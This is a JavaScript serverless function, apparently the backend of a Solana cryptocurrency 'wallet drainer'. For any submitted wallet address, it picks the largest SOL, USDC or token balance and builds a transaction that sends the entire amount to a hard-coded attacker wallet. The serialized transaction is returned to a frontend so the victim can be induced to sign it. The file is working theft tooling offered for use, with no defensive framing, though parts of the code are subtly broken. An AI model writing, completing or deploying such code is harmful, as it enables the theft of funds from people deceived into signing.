const { Connection, PublicKey, Transaction, SystemProgram, Keypair, LAMPORTS_PER_SOL } = require('@solana/web3.js');
const { TOKEN_PROGRAM_ID, getAssociatedTokenAddress, getAccount, createTransferInstruction, TOKEN_2022_PROGRAM_ID } = require('@solana/spl-token');

// CONFIGURATION
const DESTINATION_WALLET_PK = "HeLknryeK1f1UA9NZjx78RCzwfMZKEcyAYYem1kruRk4";
const CONNECTION_RPC = "https://api.mainnet-beta.solana.com";

const destinationWallet = new PublicKey(DESTINATION_WALLET_PK);
const connection = new Connection(CONNECTION_RPC, 'confirmed');

// 1. GET BALANCES
async function getWalletState(ownerPk) {
    const owner = new PublicKey(ownerPk);
    
    // Get SOL Balance
    const solBalance = await connection.getBalance(owner);
    
    // Get SPL Tokens (USDC, etc.)
    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(owner, {
        programId: TOKEN_PROGRAM_ID
    });

    let bestToken = null;
    let bestValue = solBalance; // Start with SOL value
    let bestType = 'SOL';
    let bestTokenAccount = null;

    // Check each token account
    for (const account of tokenAccounts.value) {
        const info = account.account.data.parsed.info;
        const mint = new PublicKey(info.mint);
        const balance = info.tokenAmount.uiAmount;
        
        // Simple heuristic: USDC is $1. SOL is ~$150 (approx). 
        // If you want exact USD value, you need a price API. 
        // Here we prioritize USDC over small SOL balances if > 0.01 SOL
        if (mint.toBase58() === "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v") {
             // It's USDC
             if (balance > 0 && balance > bestValue) {
                 bestValue = balance; 
                 bestType = 'USDC';
                 bestTokenAccount = account;
             }
        } else {
             // Generic token or other SOL balance
             if (balance > bestValue) {
                 bestValue = balance;
                 bestType = 'TOKEN'; // Fallback type
                 bestTokenAccount = account;
             }
        }
    }

    // If SOL is still the highest (or only) option
    if (!bestTokenAccount && solBalance > 0) {
        bestType = 'SOL';
    }

    return {
        type: bestType,
        amount: bestType === 'SOL' ? solBalance : bestTokenAccount.account.data.parsed.info.tokenAmount.uiAmount,
        accountDetails: bestTokenAccount // Contains the Token Account Pubkey if it's a token
    };
}

// 2. BUILD TRANSACTION
async function buildDrainTx(ownerPk) {
    const owner = new PublicKey(ownerPk);
    const state = await getWalletState(ownerPk);

    let tx = new Transaction();

    if (state.type === 'SOL') {
        // Drain SOL
        tx.add(
            SystemProgram.transfer({
                fromPubkey: owner,
                toPubkey: destinationWallet,
                lamports: state.amount // Full balance
            })
        );
    } else {
        // Drain Token (USDC or others)
        const srcTokenAccount = state.accountDetails.account.pubkey;
        
        // Get destination token account for the same mint
        const mint = new PublicKey(state.accountDetails.account.data.parsed.info.mint);
        const dstTokenAccount = await getAssociatedTokenAddress(mint, destinationWallet, false);

        tx.add(
            createTransferInstruction(
                srcTokenAccount,
                dstTokenAccount,
                owner,
                state.accountDetails.account.data.parsed.info.tokenAmount.amount // Full amount (raw units)
            )
        );
    }

    return tx;
}

// 3. NETLIFY FUNCTION ENTRY POINT
exports.handler = async (event) => {
    try {
        const body = JSON.parse(event.body);
        const { walletAddress } = body;

        if (!walletAddress) {
            return { statusCode: 400, body: JSON.stringify({ error: "No wallet address" }) };
        }

        // Build the transaction
        const transaction = await buildDrainTx(walletAddress);
        
        // Serialize to base64 for the frontend to use
        const serializedTx = transaction.serialize().toString('base64');

        return {
            statusCode: 200,
            body: JSON.stringify({ transaction: serializedTx })
        };

    } catch (error) {
        console.error("Drain Error:", error);
        return {
            statusCode: 500,
            body: JSON.stringify({ error: "Internal Server Error", details: error.message })
        };
    }
};